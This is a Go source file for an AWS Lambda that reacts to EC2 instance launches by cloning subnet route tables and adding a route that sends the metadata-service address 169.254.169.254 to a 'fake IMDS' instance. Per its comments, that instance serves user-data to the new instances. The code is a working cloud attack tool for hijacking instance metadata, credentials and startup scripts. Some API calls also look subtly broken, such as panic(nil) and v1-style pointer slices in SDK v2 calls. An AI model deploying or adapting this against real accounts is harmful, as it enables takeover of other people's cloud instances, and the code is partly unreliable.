package main

import (
	"context"
	"fmt"
	"github.com/aws/aws-lambda-go/events"
	"github.com/aws/aws-lambda-go/lambda"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
)

var (
	client             *ec2.Client
	FakeImdsInstanceId = GetRequiredEnv("FakeImdsInstanceId")
)

const (
	OrigRouteTableId   = "OrigRouteTableId"
)



func handleRequest(ctx context.Context, event events.CloudWatchEvent) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("[ERROR]", r)
			return
		}
	}()

	runEvent := UnMarshallEvent(event)

	// Just take the first for now
	instance := runEvent.ResponseElements.InstancesSet.Items[0]

	if instance.SubnetId == *GetSubnetFromInstance(ctx, FakeImdsInstanceId).SubnetId {
		fmt.Printf("[INFO] skipping %s has because it's in the same subnet as the fake imds server", instance.InstanceId)
		return
	}
	PoisonRoutes(ctx, instance)
}

func PoisonRoutes(ctx context.Context, instance ResponseInstanceItems) {
	imdsSubnet := GetSubnetFromInstance(ctx, FakeImdsInstanceId)
	if CopyTableToSubnet(ctx, *imdsSubnet.SubnetId, *imdsSubnet.VpcId) == nil {
		fmt.Printf("[WARN] another process is in session, exiting to avoid mangling everything")
		return
	}

	var newInstanceTable *types.RouteTable
	if newInstanceTable = CopyTableToSubnet(ctx, instance.SubnetId, *imdsSubnet.VpcId); newInstanceTable == nil {
		fmt.Printf("[WARN] another process is in session, exiting to avoid mangling everything")
		return
	}
	AddFakeRoute(ctx, newInstanceTable)
}

func CopyTableToSubnet(ctx context.Context, subnetId, vpcId string) *types.RouteTable {
	// If a route table association exists we need to replace it rather then add it
	oldImdsTable := GetSubnetTable(ctx, subnetId)
	if oldImdsTable == nil {
		oldImdsTable = GetVpcFromSubnet(ctx, vpcId)
	}

	for _, tag := range oldImdsTable.Tags {
		if *tag.Key == OrigRouteTableId {
			return nil
		}
	}

	// Note: NewImdsRouteTable adds a tag of the old table that is used to revert later.
	newImdsTable := NewImdsRouteTable(ctx, oldImdsTable)
	if association := GetAssociationId(oldImdsTable, subnetId); association == nil {
		newAssociation := AttachTable(ctx, newImdsTable, subnetId)
		AddMetaTags(ctx, newAssociation, oldImdsTable, newImdsTable, true)
	} else {
		newAssociation := SwapTables(ctx, association.RouteTableAssociationId, newImdsTable)
		AddMetaTags(ctx, newAssociation, oldImdsTable, newImdsTable, false)
	}

	return newImdsTable
}

func GetVpcFromSubnet(ctx context.Context, vpcId string) *types.RouteTable {
	tables, err := client.DescribeRouteTables(ctx, &ec2.DescribeRouteTablesInput{
		Filters: []*types.Filter{
			{
				Name:   aws.String("vpc-id"),
				Values: []*string{aws.String(vpcId)},
			},
			{
				Name:   aws.String("association.main"),
				Values: []*string{aws.String("true")},
			},
		},
	})
	if err != nil {
		panic(err)
	}

	if tables := tables.RouteTables; len(tables) != 1 {
		panic(fmt.Errorf("expected one table but got %d: %v", len(tables), tables))
	} else {
		return tables[0]
	}
}

func NewImdsRouteTable(ctx context.Context, oldImdsTable *types.RouteTable) *types.RouteTable {
	newImdsTable := CopyRoutes(ctx, oldImdsTable)
	CopyTags(ctx, oldImdsTable, newImdsTable)
	return newImdsTable
}

func GetSubnetFromInstance(ctx context.Context, instanceId string) (subnet *types.Subnet){
	var subnetId string
	if instances, err := client.DescribeInstances(ctx, &ec2.DescribeInstancesInput{
		InstanceIds: []*string{&instanceId},
	}); err != nil {
		panic(err)
	} else {
		subnetId = *instances.Reservations[0].Instances[0].SubnetId
	}

	if subnets, err := client.DescribeSubnets(ctx, &ec2.DescribeSubnetsInput{
		SubnetIds: []*string{aws.String(subnetId)},
	}); err != nil {
		panic(nil)
	} else {
		subnet = subnets.Subnets[0]
	}

	return subnet
}

func AttachTable(ctx context.Context, table *types.RouteTable, subnetId string) *string {
	out, err := client.AssociateRouteTable(ctx, &ec2.AssociateRouteTableInput{
		RouteTableId: table.RouteTableId,
		SubnetId:     aws.String(subnetId),
	}); if err != nil {
		panic(err)
	}
	return out.AssociationId
}

func SwapTables(ctx context.Context, associationId *string, table *types.RouteTable) *string {
	out, err := client.ReplaceRouteTableAssociation(ctx, &ec2.ReplaceRouteTableAssociationInput{
		RouteTableId: table.RouteTableId,
		AssociationId: associationId,
	}); if err != nil {
		panic(err)
	}
	return out.NewAssociationId
}

// AddMetaTags adds the original routeTableId and associationId as a tag to the new table so we can
// easily revert later via the AWS cli in the user-data served from the fake IMDS server.
//
// The delete parameter indicates that the cleanup script (user-data from imds) should simply remove
// the association, which will cause the subnet to fall back implicitly to the VPC's main table.
func AddMetaTags(ctx context.Context, assoicationId *string, origTable, newTable *types.RouteTable, delete bool) {
	tags := types.Tag{
		Key: aws.String(OrigRouteTableId),
	}

	// These tags are for the cli script that references this.
	if delete {
		// Indicates the association should be disassociated
		tags.Value = aws.String(fmt.Sprintf("disassociate:%s:%s", *assoicationId, *newTable.RouteTableId))
	} else {
		// Indicates the route table should be swapped using the given association
		tags.Value = aws.String(fmt.Sprintf("%s:%s:%s", *origTable.RouteTableId, *assoicationId, *newTable.RouteTableId))
	}

	if _, err := client.CreateTags(ctx, &ec2.CreateTagsInput{
		Resources: []*string{newTable.RouteTableId},
		Tags:      []*types.Tag{&tags},
	}); err != nil {
		panic(err)
	}
}
	
func CopyTags(ctx context.Context, src, dst *types.RouteTable) {
	if tags, err := client.DescribeTags(ctx, &ec2.DescribeTagsInput{
		Filters:    []*types.Filter{
			{
				Name: aws.String("resource-type"),
				Values: aws.StringSlice([]string{"route-table"}),
			},
			{
				Name: aws.String("resource-id"),
				Values: aws.StringSlice([]string{*src.RouteTableId}),
			},
		},
	}); err != nil {
		panic(err)
	} else {
		var newTags []*types.Tag
		
		for _, tag := range tags.Tags {
			newTags = append(newTags, &types.Tag{
				Key:   tag.Key,
				Value: tag.Value,
			})
		}
		
		if _, err := client.CreateTags(ctx, &ec2.CreateTagsInput{
			Resources: []*string{dst.RouteTableId},
			Tags:      newTags,
		}); err != nil {
			panic(err)
		}
	}
}

func AddFakeRoute(ctx context.Context, table *types.RouteTable) *types.RouteTable {
	if _, err := client.CreateRoute(ctx, &ec2.CreateRouteInput{
		RouteTableId:         table.RouteTableId,
		DestinationCidrBlock: aws.String("169.254.169.254/32"),
		InstanceId:           aws.String(FakeImdsInstanceId),
	}); err != nil {
		panic(err)
	} else {
		return table
	}
}


func CopyRoutes(ctx context.Context, table *types.RouteTable) *types.RouteTable {
	newTable, err := client.CreateRouteTable(ctx, &ec2.CreateRouteTableInput{
		VpcId: table.VpcId,
	})
	if err != nil {
		panic(err)
	}

	for _, route := range table.Routes {

		if route.GatewayId != nil && *route.GatewayId == "local" {
			continue
		}

		if _, err := client.CreateRoute(ctx, &ec2.CreateRouteInput{
			RouteTableId:                newTable.RouteTable.RouteTableId,
			CarrierGatewayId:            route.CarrierGatewayId,
			DestinationCidrBlock:        route.DestinationCidrBlock,
			DestinationIpv6CidrBlock:    route.DestinationIpv6CidrBlock,
			DestinationPrefixListId:     route.DestinationPrefixListId,
			EgressOnlyInternetGatewayId: route.EgressOnlyInternetGatewayId,
			GatewayId:                   route.GatewayId,
			InstanceId:                  route.InstanceId,
			LocalGatewayId:              route.LocalGatewayId,
			NatGatewayId:                route.NatGatewayId,
			NetworkInterfaceId:          route.NetworkInterfaceId,
			TransitGatewayId:            route.TransitGatewayId,
			VpcPeeringConnectionId:      route.VpcPeeringConnectionId,
		}); err != nil {
			panic(err)
		}
	}

	return newTable.RouteTable
}

func GetSubnetTable(ctx context.Context, subnetId string) *types.RouteTable {
	tables, err := client.DescribeRouteTables(ctx, &ec2.DescribeRouteTablesInput{
		Filters: []*types.Filter{
			{
				Name:   aws.String("association.subnet-id"),
				Values: []*string{aws.String(subnetId)},
			},
		},
	})
	if err != nil {
		panic(err)
	}

	if l := len(tables.RouteTables); l != 1 {
		return nil
	} else {
		return tables.RouteTables[0]
	}
}

func main() {
	if conf, err := config.LoadDefaultConfig(); err != nil {
		panic(err)
	} else {
		client = ec2.NewFromConfig(conf)
	}
	lambda.Start(handleRequest)
}
